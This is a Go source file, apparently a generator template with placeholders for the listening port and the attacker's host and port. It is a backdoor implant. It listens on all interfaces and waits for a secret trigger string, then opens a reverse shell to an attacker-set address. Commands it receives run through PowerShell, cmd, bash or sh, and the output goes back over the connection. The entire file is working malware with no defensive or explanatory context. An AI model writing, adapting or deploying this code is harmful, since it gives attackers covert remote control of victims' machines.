package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"runtime"
)

const (
	HOST          = "0.0.0.0"
	PORT          = {lport}
	IP            = "{lhost}"
	PUERTO        = {listener}
	especialCadena = "grisiscomebacksayknokknok"
)

func buscarCadenaEspecial(data string) bool {
	return strings.Contains(data, especialCadena)
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	var request strings.Builder
	data, err := io.ReadAll(reader)
	if err != nil {
		return
	}
	request.Write(data)
	if buscarCadenaEspecial(request.String()) {
		reverseShell(IP, PUERTO)
	}
}

func reverseShell(ip string, port int) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return
	}
	defer conn.Close()

	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			return
		}

		message = strings.TrimSuffix(message, "\n")
		
		osName := runtime.GOOS
		switch osName {
			case "windows":
				if _, err := exec.LookPath("powershell"); err == nil {
					cmd := exec.Command("powershell", "-Command", message)
					cmd.Stderr = conn
					cmd.Stdout = conn
					cmd.Stdin = conn
					cmd.Run()
				}
				cmd := exec.Command("cmd", "/C", message)
				cmd.Stderr = conn
				cmd.Stdout = conn
				cmd.Stdin = conn
				cmd.Run()
			case "linux", "darwin":
				if _, err := exec.LookPath("bash"); err == nil {
					cmd := exec.Command("bash", "-c", message)
					cmd.Stderr = conn
					cmd.Stdout = conn
					cmd.Stdin = conn
					cmd.Run()
				}
				cmd := exec.Command("/bin/sh", "-c", message)
				cmd.Stderr = conn
				cmd.Stdout = conn
				cmd.Stdin = conn
				cmd.Run()
			default:
				cmd := exec.Command("powershell", "-Command", message)
				cmd.Stderr = conn
				cmd.Stdout = conn
				cmd.Stdin = conn
				cmd.Run()				
			}
	}
}

func main() {
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", HOST, PORT))
	if err != nil {
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleConnection(conn)
	}
}
